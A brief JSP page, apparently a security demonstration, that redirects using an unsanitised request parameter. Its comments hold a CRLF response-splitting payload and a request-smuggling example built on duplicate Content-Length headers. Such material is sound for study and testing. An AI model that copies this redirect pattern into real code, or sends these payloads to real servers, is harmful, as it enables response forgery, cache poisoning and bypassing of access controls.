<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%
	response.sendRedirect("index.jsp?id=" + request.getParameter("id"));

//%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2015%0d%0a%0d%0a<html>ok</html>

//POST http://www.example.com/some.html HTTP/1.1
//Host: www.example.com
//Connection: Keep-Alive
//Content-Type: application/x-www-form-urlencoded
//Content-Length: 0
//Content-Length: 39
 
//GET /resource_denied.html HTTP/1.1
//Blah: GET http://www.example.com/welcome.html HTTP/1.1
//Host: www.example.com
//Connection: Keep-Alive
%>